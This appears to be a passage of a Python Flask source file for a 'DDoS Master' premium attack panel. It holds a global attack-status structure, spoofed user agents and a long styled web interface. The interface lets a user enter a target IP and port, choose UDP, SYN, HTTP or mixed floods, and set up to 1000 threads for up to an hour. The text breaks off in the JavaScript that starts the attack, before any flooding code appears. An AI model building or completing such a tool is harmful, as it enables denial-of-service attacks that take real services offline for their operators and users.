import os
import sys
import time
import random
import string
import threading
import socket
import requests
from flask import Flask, request, render_template_string, jsonify, session
from datetime import datetime
import hashlib
import json
from functools import wraps
import psutil
import platform

app = Flask(__name__)
app.secret_key = ''.join(random.choices(string.ascii_letters + string.digits, k=64))

# ==================== KONFIGURASI PREMIUM ====================
MAX_THREADS = 1000
TIMEOUT = 2
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
]

# ==================== STATUS GLOBAL ====================
attack_status = {
    'active': False,
    'target': '',
    'port': 0,
    'attack_type': '',
    'threads': 0,
    'duration': 0,
    'packets_sent': 0,
    'bytes_sent': 0,
    'errors': 0,
    'start_time': None,
    'end_time': None,
    'attack_id': None,
    'network_speed': 0,
    'success_rate': 100,
    'response_time': 0
}

stop_flag = False
attack_threads = []

# ==================== PREMIUM UI TEMPLATE ====================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS Master | Premium Attack Panel</title>
    
    <!-- Fonts & Icons -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    
    <style>
        /* ==================== VARIABLES ==================== */
        :root {
            --bg-primary: #0a0c0f;
            --bg-secondary: #15181e;
            --bg-tertiary: #1e232b;
            --accent-primary: #ff0055;
            --accent-secondary: #7000ff;
            --accent-gradient: linear-gradient(135deg, #ff0055, #7000ff);
            --text-primary: #ffffff;
            --text-secondary: #a0a8b8;
            --text-tertiary: #6c7a8e;
            --success: #00ff9d;
            --warning: #ffd600;
            --danger: #ff0055;
            --info: #00b8ff;
            --border: rgba(255,255,255,0.08);
            --card-shadow: 0 20px 40px rgba(0,0,0,0.5);
            --glow: 0 0 20px rgba(255,0,85,0.3);
        }
        
        /* ==================== RESET & BASE ==================== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }
        
        /* ==================== BACKGROUND ANIMATIONS ==================== */
        .noise {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48ZmlsdGVyIGlkPSJmIj48ZmVUdXJidWxlbmNlIHR5cGU9ImZyYWN0YWxOb2lzZSIgYmFzZUZyZXF1ZW5jeT0iLjc1IiBudW1PY3RhdmVzPSIzIiAvPjwvZmlsdGVyPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbHRlcj0idXJsKCNmKSIgb3BhY2l0eT0iMC4wMjUiIC8+PC9zdmc+');
            pointer-events: none;
            opacity: 0.3;
            z-index: 0;
            animation: noise 0.2s infinite;
        }
        
        @keyframes noise {
            0%, 100% { transform: translate(0,0); }
            10% { transform: translate(-1%,-1%); }
            20% { transform: translate(1%,1%); }
            30% { transform: translate(-2%,-2%); }
            40% { transform: translate(2%,2%); }
            50% { transform: translate(-3%,-3%); }
            60% { transform: translate(3%,3%); }
            70% { transform: translate(-2%,-2%); }
            80% { transform: translate(2%,2%); }
            90% { transform: translate(-1%,-1%); }
        }
        
        .gradient-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 30%, rgba(255,0,85,0.15) 0%, transparent 50%),
                        radial-gradient(circle at 80% 70%, rgba(112,0,255,0.15) 0%, transparent 50%);
            z-index: 0;
            animation: gradientMove 20s ease infinite;
        }
        
        @keyframes gradientMove {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .grid-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(255,0,85,0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(112,0,255,0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: 0;
            animation: gridMove 15s linear infinite;
        }
        
        @keyframes gridMove {
            0% { transform: translate(0,0); }
            100% { transform: translate(50px,50px); }
        }
        
        /* ==================== MAIN CONTAINER ==================== */
        .app {
            position: relative;
            z-index: 1;
            max-width: 1600px;
            margin: 0 auto;
            padding: 30px 40px;
        }
        
        /* ==================== HEADER ==================== */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 50px;
            animation: slideDown 0.8s ease-out;
        }
        
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo-icon {
            width: 60px;
            height: 60px;
            background: var(--accent-gradient);
            border-radius: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            box-shadow: var(--glow);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 20px rgba(255,0,85,0.3); }
            50% { box-shadow: 0 0 40px rgba(255,0,85,0.6); }
        }
        
        .logo-icon i {
            font-size: 30px;
            color: white;
            filter: drop-shadow(0 0 10px rgba(255,255,255,0.5));
            animation: rotate 10s linear infinite;
        }
        
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        .logo-text h1 {
            font-size: 32px;
            font-weight: 800;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 1px;
        }
        
        .logo-text p {
            color: var(--text-secondary);
            font-size: 14px;
            letter-spacing: 2px;
        }
        
        .stats-header {
            display: flex;
            gap: 25px;
            background: rgba(30, 35, 43, 0.5);
            backdrop-filter: blur(10px);
            padding: 20px 30px;
            border-radius: 30px;
            border: 1px solid var(--border);
            animation: slideDown 0.8s ease-out 0.2s both;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-label {
            color: var(--text-tertiary);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 5px;
        }
        
        .stat-value {
            font-size: 24px;
            font-weight: 700;
            color: var(--text-primary);
        }
        
        /* ==================== MAIN GRID ==================== */
        .main-grid {
            display: grid;
            grid-template-columns: 1.2fr 0.8fr;
            gap: 30px;
            margin-bottom: 30px;
        }
        
        @media (max-width: 1200px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }
        
        /* ==================== ATTACK CARD ==================== */
        .attack-card {
            background: rgba(30, 35, 43, 0.5);
            backdrop-filter: blur(10px);
            border: 1px solid var(--border);
            border-radius: 40px;
            padding: 40px;
            animation: slideIn 0.8s ease-out 0.4s both;
            box-shadow: var(--card-shadow);
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-30px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        .card-title {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .card-title-icon {
            width: 50px;
            height: 50px;
            background: var(--accent-gradient);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .card-title-icon i {
            font-size: 24px;
            color: white;
        }
        
        .card-title h2 {
            font-size: 24px;
            font-weight: 600;
        }
        
        .card-title p {
            color: var(--text-tertiary);
            font-size: 14px;
        }
        
        /* Form Elements */
        .form-group {
            margin-bottom: 25px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 10px;
            color: var(--text-secondary);
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 0.5px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .input-wrapper i {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-tertiary);
            font-size: 18px;
            transition: all 0.3s;
        }
        
        .input-wrapper input,
        .input-wrapper select {
            width: 100%;
            height: 60px;
            background: rgba(10, 12, 15, 0.8);
            border: 2px solid transparent;
            border-radius: 20px;
            padding: 0 20px 0 50px;
            color: var(--text-primary);
            font-size: 16px;
            font-family: 'Space Mono', monospace;
            transition: all 0.3s;
        }
        
        .input-wrapper input:focus,
        .input-wrapper select:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 4px rgba(255,0,85,0.1);
        }
        
        .input-wrapper input:hover,
        .input-wrapper select:hover {
            background: rgba(20, 25, 30, 0.9);
        }
        
        .input-hint {
            margin-top: 8px;
            font-size: 12px;
            color: var(--text-tertiary);
            padding-left: 20px;
        }
        
        .input-hint i {
            margin-right: 5px;
            color: var(--accent-primary);
        }
        
        /* Range Slider */
        .range-wrapper {
            padding: 0 10px;
        }
        
        .range-wrapper input[type=range] {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            outline: none;
            -webkit-appearance: none;
        }
        
        .range-wrapper input[type=range]::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 25px;
            height: 25px;
            background: var(--accent-gradient);
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 0 20px rgba(255,0,85,0.5);
            transition: all 0.2s;
        }
        
        .range-wrapper input[type=range]::-webkit-slider-thumb:hover {
            transform: scale(1.2);
        }
        
        .range-values {
            display: flex;
            justify-content: space-between;
            margin-top: 10px;
            color: var(--text-tertiary);
            font-size: 12px;
        }
        
        /* Attack Types Grid */
        .attack-types {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .attack-type {
            background: rgba(10, 12, 15, 0.8);
            border: 2px solid transparent;
            border-radius: 20px;
            padding: 20px;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .attack-type::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            transition: left 0.5s;
        }
        
        .attack-type:hover::before {
            left: 100%;
        }
        
        .attack-type.selected {
            border-color: var(--accent-primary);
            background: linear-gradient(135deg, rgba(255,0,85,0.1), rgba(112,0,255,0.1));
            box-shadow: 0 0 30px rgba(255,0,85,0.2);
        }
        
        .attack-type i {
            font-size: 30px;
            margin-bottom: 10px;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .attack-type h4 {
            font-size: 16px;
            margin-bottom: 5px;
        }
        
        .attack-type p {
            font-size: 12px;
            color: var(--text-tertiary);
        }
        
        /* Attack Button */
        .attack-button {
            width: 100%;
            height: 70px;
            background: var(--accent-gradient);
            border: none;
            border-radius: 35px;
            color: white;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: 2px;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
            margin-top: 20px;
            box-shadow: 0 10px 30px rgba(255,0,85,0.3);
        }
        
        .attack-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }
        
        .attack-button:hover::before {
            left: 100%;
        }
        
        .attack-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 20px 40px rgba(255,0,85,0.4);
        }
        
        .attack-button:active {
            transform: translateY(0);
        }
        
        .attack-button.stop {
            background: linear-gradient(135deg, #ff5555, #aa0000);
            box-shadow: 0 10px 30px rgba(255,0,0,0.3);
        }
        
        /* ==================== STATS CARD ==================== */
        .stats-card {
            background: rgba(30, 35, 43, 0.5);
            backdrop-filter: blur(10px);
            border: 1px solid var(--border);
            border-radius: 40px;
            padding: 40px;
            animation: slideInRight 0.8s ease-out 0.6s both;
            box-shadow: var(--card-shadow);
        }
        
        @keyframes slideInRight {
            from { opacity: 0; transform: translateX(30px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-box {
            background: rgba(10, 12, 15, 0.8);
            border-radius: 25px;
            padding: 25px 20px;
            text-align: center;
            border: 1px solid var(--border);
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .stat-box::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255,0,85,0.1), rgba(112,0,255,0.1));
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .stat-box:hover::after {
            opacity: 1;
        }
        
        .stat-icon {
            font-size: 30px;
            margin-bottom: 15px;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .stat-box h3 {
            font-size: 14px;
            color: var(--text-tertiary);
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .stat-box .value {
            font-size: 36px;
            font-weight: 700;
            font-family: 'Space Mono', monospace;
            color: var(--text-primary);
            line-height: 1;
        }
        
        .stat-box .unit {
            font-size: 14px;
            color: var(--text-tertiary);
            margin-left: 5px;
        }
        
        .stat-box .trend {
            margin-top: 10px;
            font-size: 12px;
        }
        
        .trend.up { color: var(--success); }
        .trend.down { color: var(--danger); }
        
        /* Progress Bars */
        .progress-section {
            margin-bottom: 25px;
        }
        
        .progress-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: var(--text-secondary);
            font-size: 14px;
        }
        
        .progress-bar {
            width: 100%;
            height: 10px;
            background: rgba(10, 12, 15, 0.8);
            border-radius: 10px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: var(--accent-gradient);
            border-radius: 10px;
            width: 0%;
            transition: width 0.5s;
            position: relative;
            overflow: hidden;
        }
        
        .progress-fill::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: shimmer 2s infinite;
        }
        
        @keyframes shimmer {
            100% { left: 100%; }
        }
        
        /* Activity Log */
        .activity-log {
            background: rgba(10, 12, 15, 0.8);
            border-radius: 25px;
            padding: 25px;
            margin-top: 30px;
        }
        
        .log-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .log-header h3 {
            font-size: 18px;
            font-weight: 600;
        }
        
        .log-header i {
            color: var(--text-tertiary);
            cursor: pointer;
            transition: color 0.3s;
        }
        
        .log-header i:hover {
            color: var(--accent-primary);
        }
        
        .log-entries {
            max-height: 200px;
            overflow-y: auto;
            padding-right: 10px;
        }
        
        .log-entries::-webkit-scrollbar {
            width: 5px;
        }
        
        .log-entries::-webkit-scrollbar-track {
            background: rgba(255,255,255,0.05);
        }
        
        .log-entries::-webkit-scrollbar-thumb {
            background: var(--accent-gradient);
            border-radius: 5px;
        }
        
        .log-entry {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 12px 0;
            border-bottom: 1px solid var(--border);
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .log-time {
            color: var(--text-tertiary);
            font-size: 12px;
            font-family: 'Space Mono', monospace;
            min-width: 60px;
        }
        
        .log-icon {
            width: 30px;
            height: 30px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .log-icon.success { background: rgba(0,255,157,0.2); color: var(--success); }
        .log-icon.error { background: rgba(255,0,85,0.2); color: var(--danger); }
        .log-icon.info { background: rgba(0,184,255,0.2); color: var(--info); }
        
        .log-message {
            flex: 1;
            font-size: 14px;
        }
        
        .log-target {
            color: var(--text-tertiary);
            font-size: 12px;
            font-family: 'Space Mono', monospace;
        }
        
        /* ==================== CHARTS SECTION ==================== */
        .charts-section {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 30px;
            margin-top: 30px;
        }
        
        .chart-card {
            background: rgba(30, 35, 43, 0.5);
            backdrop-filter: blur(10px);
            border: 1px solid var(--border);
            border-radius: 30px;
            padding: 30px;
            animation: fadeIn 1s ease-out 0.8s both;
        }
        
        .chart-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }
        
        .chart-header h3 {
            font-size: 18px;
            font-weight: 600;
        }
        
        .chart-header select {
            background: rgba(10, 12, 15, 0.8);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 8px 15px;
            color: var(--text-primary);
            font-size: 14px;
            cursor: pointer;
        }
        
        .chart-container {
            height: 200px;
            position: relative;
        }
        
        /* Simple Chart Bars */
        .chart-bars {
            display: flex;
            align-items: flex-end;
            justify-content: space-around;
            height: 150px;
            margin-top: 20px;
        }
        
        .bar-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 40px;
        }
        
        .bar {
            width: 30px;
            background: var(--accent-gradient);
            border-radius: 15px 15px 0 0;
            transition: height 0.3s;
            position: relative;
            cursor: pointer;
        }
        
        .bar:hover {
            transform: scaleX(1.1);
            box-shadow: 0 0 20px rgba(255,0,85,0.5);
        }
        
        .bar-label {
            margin-top: 10px;
            font-size: 12px;
            color: var(--text-tertiary);
        }
        
        /* ==================== NETWORK ACTIVITY ==================== */
        .network-activity {
            background: rgba(30, 35, 43, 0.5);
            backdrop-filter: blur(10px);
            border: 1px solid var(--border);
            border-radius: 30px;
            padding: 30px;
            margin-top: 30px;
            animation: fadeIn 1s ease-out 1s both;
        }
        
        .activity-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }
        
        .packet-visualization {
            display: flex;
            gap: 5px;
            height: 80px;
            align-items: flex-end;
        }
        
        .packet-bar {
            flex: 1;
            background: linear-gradient(180deg, #ff0055, #7000ff);
            border-radius: 5px 5px 0 0;
            transition: height 0.1s;
            animation: packetPulse 1s infinite;
        }
        
        @keyframes packetPulse {
            0%, 100% { opacity: 0.8; }
            50% { opacity: 1; }
        }
        
        /* ==================== RESPONSIVE ==================== */
        @media (max-width: 768px) {
            .app { padding: 20px; }
            .header { flex-direction: column; gap: 20px; }
            .main-grid { grid-template-columns: 1fr; }
            .charts-section { grid-template-columns: 1fr; }
        }
        
        /* ==================== LOADING ANIMATIONS ==================== */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: var(--accent-primary);
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* ==================== TOAST NOTIFICATIONS ==================== */
        .toast-container {
            position: fixed;
            bottom: 30px;
            right: 30px;
            z-index: 9999;
        }
        
        .toast {
            background: rgba(30, 35, 43, 0.9);
            backdrop-filter: blur(10px);
            border-left: 4px solid var(--accent-primary);
            border-radius: 15px;
            padding: 15px 25px;
            margin-top: 10px;
            display: flex;
            align-items: center;
            gap: 15px;
            animation: slideInToast 0.3s ease-out;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        
        @keyframes slideInToast {
            from { opacity: 0; transform: translateX(50px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        .toast.success { border-left-color: var(--success); }
        .toast.error { border-left-color: var(--danger); }
        .toast.warning { border-left-color: var(--warning); }
    </style>
</head>
<body>
    <div class="noise"></div>
    <div class="gradient-bg"></div>
    <div class="grid-overlay"></div>
    
    <div class="app">
        <!-- Header -->
        <div class="header">
            <div class="logo">
                <div class="logo-icon">
                    <i class="fas fa-skull"></i>
                </div>
                <div class="logo-text">
                    <h1>DDoS MASTER</h1>
                    <p>PREMIUM ATTACK PANEL v2.0</p>
                </div>
            </div>
            
            <div class="stats-header">
                <div class="stat-item">
                    <div class="stat-label">System Uptime</div>
                    <div class="stat-value" id="uptime">00:00:00</div>
                </div>
                <div class="stat-item">
                    <div class="stat-label">Active Attacks</div>
                    <div class="stat-value" id="activeCount">0</div>
                </div>
                <div class="stat-item">
                    <div class="stat-label">Total Packets</div>
                    <div class="stat-value" id="totalPackets">0</div>
                </div>
            </div>
        </div>
        
        <!-- Main Grid -->
        <div class="main-grid">
            <!-- Attack Configuration Card -->
            <div class="attack-card">
                <div class="card-title">
                    <div class="card-title-icon">
                        <i class="fas fa-crosshairs"></i>
                    </div>
                    <div>
                        <h2>Attack Configuration</h2>
                        <p>Configure your attack parameters</p>
                    </div>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-bullseye"></i> Target IP Address</label>
                    <div class="input-wrapper">
                        <i class="fas fa-globe"></i>
                        <input type="text" id="target" placeholder="192.168.1.1" value="{{ target if target else '' }}">
                    </div>
                    <div class="input-hint">
                        <i class="fas fa-info-circle"></i> Enter IPv4 address or domain
                    </div>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-plug"></i> Port Number</label>
                    <div class="input-wrapper">
                        <i class="fas fa-ethernet"></i>
                        <input type="number" id="port" placeholder="80" min="1" max="65535" value="{{ port if port else '80' }}">
                    </div>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-bolt"></i> Attack Type</label>
                    <div class="attack-types">
                        <div class="attack-type" data-type="udp" onclick="selectType(this)">
                            <i class="fas fa-broadcast-tower"></i>
                            <h4>UDP Flood</h4>
                            <p>High bandwidth consumption</p>
                        </div>
                        <div class="attack-type" data-type="syn" onclick="selectType(this)">
                            <i class="fas fa-random"></i>
                            <h4>SYN Flood</h4>
                            <p>TCP handshake exhaustion</p>
                        </div>
                        <div class="attack-type" data-type="http" onclick="selectType(this)">
                            <i class="fas fa-cloud"></i>
                            <h4>HTTP Flood</h4>
                            <p>Layer 7 attack</p>
                        </div>
                        <div class="attack-type" data-type="mixed" onclick="selectType(this)">
                            <i class="fas fa-infinity"></i>
                            <h4>Mixed Mode</h4>
                            <p>All vectors combined</p>
                        </div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-tachometer-alt"></i> Thread Count: <span id="threadValue">500</span></label>
                    <div class="range-wrapper">
                        <input type="range" id="threads" min="10" max="1000" value="500" step="10" oninput="updateThreads(this.value)">
                        <div class="range-values">
                            <span>10</span>
                            <span>250</span>
                            <span>500</span>
                            <span>750</span>
                            <span>1000</span>
                        </div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-hourglass-half"></i> Duration (seconds): <span id="durationValue">60</span></label>
                    <div class="range-wrapper">
                        <input type="range" id="duration" min="10" max="3600" value="60" step="10" oninput="updateDuration(this.value)">
                        <div class="range-values">
                            <span>10s</span>
                            <span>15m</span>
                            <span>30m</span>
                            <span>45m</span>
                            <span>1h</span>
                        </div>
                    </div>
                </div>
                
                <button class="attack-button" id="attackBtn" onclick="startAttack()">
                    <i class="fas fa-skull-crossbones"></i> INITIATE ATTACK
                </button>
            </div>
            
            <!-- Live Statistics Card -->
            <div class="stats-card">
                <div class="card-title">
                    <div class="card-title-icon">
                        <i class="fas fa-chart-line"></i>
                    </div>
                    <div>
                        <h2>Live Statistics</h2>
                        <p>Real-time attack metrics</p>
                    </div>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-box">
                        <div class="stat-icon"><i class="fas fa-rocket"></i></div>
                        <h3>PACKETS/SEC</h3>
                        <div><span class="value" id="packetsPerSec">0</span><span class="unit">pps</span></div>
                        <div class="trend up" id="packetTrend"><i class="fas fa-arrow-up"></i> +12%</div>
                    </div>
                    
                    <div class="stat-box">
                        <div class="stat-icon"><i class="fas fa-weight-hanging"></i></div>
                        <h3>BANDWIDTH</h3>
                        <div><span class="value" id="bandwidth">0</span><span class="unit">Mbps</span></div>
                        <div class="trend up" id="bandwidthTrend"><i class="fas fa-arrow-up"></i> +8%</div>
                    </div>
                    
                    <div class="stat-box">
                        <div class="stat-icon"><i class="fas fa-check-circle"></i></div>
                        <h3>SUCCESS RATE</h3>
                        <div><span class="value" id="successRate">100</span><span class="unit">%</span></div>
                        <div class="trend" id="successTrend"><i class="fas fa-minus"></i> stable</div>
                    </div>
                    
                    <div class="stat-box">
                        <div class="stat-icon"><i class="fas fa-clock"></i></div>
                        <h3>RESPONSE TIME</h3>
                        <div><span class="value" id="responseTime">0</span><span class="unit">ms</span></div>
                        <div class="trend down" id="responseTrend"><i class="fas fa-arrow-down"></i> -5ms</div>
                    </div>
                </div>
                
                <div class="progress-section">
                    <div class="progress-header">
                        <span>Attack Progress</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressBar" style="width: 0%"></div>
                    </div>
                </div>
                
                <div class="progress-section">
                    <div class="progress-header">
                        <span>Network Load</span>
                        <span id="networkLoadPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="networkLoad" style="width: 0%"></div>
                    </div>
                </div>
                
                <div class="activity-log">
                    <div class="log-header">
                        <h3><i class="fas fa-terminal"></i> Attack Activity</h3>
                        <i class="fas fa-sync-alt" onclick="refreshLog()"></i>
                    </div>
                    <div class="log-entries" id="logEntries">
                        <div class="log-entry">
                            <span class="log-time">00:00:00</span>
                            <div class="log-icon info"><i class="fas fa-info"></i></div>
                            <span class="log-message">System initialized</span>
                            <span class="log-target">ready</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Charts Section -->
        <div class="charts-section">
            <div class="chart-card">
                <div class="chart-header">
                    <h3><i class="fas fa-chart-bar"></i> Packet Rate History</h3>
                    <select id="packetRange">
                        <option value="1m">Last minute</option>
                        <option value="5m">Last 5 minutes</option>
                        <option value="15m">Last 15 minutes</option>
                    </select>
                </div>
                <div class="chart-container">
                    <div class="chart-bars" id="packetChart">
                        <div class="bar-wrapper"><div class="bar" style="height: 30px"></div><span class="bar-label">10s</span></div>
                        <div class="bar-wrapper"><div class="bar" style="height: 45px"></div><span class="bar-label">20s</span></div>
                        <div class="bar-wrapper"><div class="bar" style="height: 60px"></div><span class="bar-label">30s</span></div>
                        <div class="bar-wrapper"><div class="bar" style="height: 80px"></div><span class="bar-label">40s</span></div>
                        <div class="bar-wrapper"><div class="bar" style="height: 55px"></div><span class="bar-label">50s</span></div>
                        <div class="bar-wrapper"><div class="bar" style="height: 70px"></div><span class="bar-label">60s</span></div>
                    </div>
                </div>
            </div>
            
            <div class="chart-card">
                <div class="chart-header">
                    <h3><i class="fas fa-chart-pie"></i> Attack Distribution</h3>
                </div>
                <div class="chart-container" style="display: flex; justify-content: center; align-items: center;">
                    <div style="width: 150px; height: 150px; border-radius: 50%; background: conic-gradient(#ff0055 0% 40%, #7000ff 40% 70%, #00b8ff 70% 85%, #00ff9d 85% 100%);"></div>
                </div>
            </div>
        </div>
        
        <!-- Network Activity Visualization -->
        <div class="network-activity">
            <div class="activity-header">
                <h3><i class="fas fa-network-wired"></i> Real-time Network Activity</h3>
                <span class="badge" id="networkStatus">● Active</span>
            </div>
            <div class="packet-visualization" id="packetVisualization">
                <div class="packet-bar" style="height: 20px"></div>
                <div class="packet-bar" style="height: 35px"></div>
                <div class="packet-bar" style="height: 50px"></div>
                <div class="packet-bar" style="height: 65px"></div>
                <div class="packet-bar" style="height: 45px"></div>
                <div class="packet-bar" style="height: 80px"></div>
                <div class="packet-bar" style="height: 55px"></div>
                <div class="packet-bar" style="height: 70px"></div>
                <div class="packet-bar" style="height: 40px"></div>
                <div class="packet-bar" style="height: 95px"></div>
                <div class="packet-bar" style="height: 30px"></div>
                <div class="packet-bar" style="height: 60px"></div>
                <div class="packet-bar" style="height: 75px"></div>
                <div class="packet-bar" style="height: 50px"></div>
                <div class="packet-bar" style="height: 85px"></div>
                <div class="packet-bar" style="height: 45px"></div>
            </div>
        </div>
    </div>
    
    <!-- Toast Container -->
    <div class="toast-container" id="toastContainer"></div>
    
    <!-- JavaScript -->
    <script>
        // ==================== GLOBAL VARIABLES ====================
        let selectedAttackType = 'udp';
        let attackActive = false;
        let updateInterval;
        let packetHistory = [];
        let attackStartTime = null;
        
        // ==================== INITIALIZATION ====================
        document.addEventListener('DOMContentLoaded', function() {
            // Select default attack type
            document.querySelector('.attack-type').classList.add('selected');
            startRealtimeUpdates();
        });
        
        // ==================== UI FUNCTIONS ====================
        function selectType(element) {
            document.querySelectorAll('.attack-type').forEach(el => el.classList.remove('selected'));
            element.classList.add('selected');
            selectedAttackType = element.dataset.type;
        }
        
        function updateThreads(value) {
            document.getElementById('threadValue').textContent = value;
        }
        
        function updateDuration(value) {
            let display;
            if (value < 60) display = value + 's';
            else if (value < 3600) display = Math.floor(value / 60) + 'm ' + (value % 60) + 's';
            else display = Math.floor(value / 3600) + 'h ' + Math.floor((value % 3600) / 60) + 'm';
            document.getElementById('durationValue').textContent = display;
        }
        
        // ==================== ATTACK FUNCTIONS ====================
        function startAttack() {
            const target = document.getElementById('target').value;
            const port = document.getElementById('port').value;
            const threads = document.getElementById('threads').value;
            const duration = document.getElementById('duration').value;
            
            if (!target) {
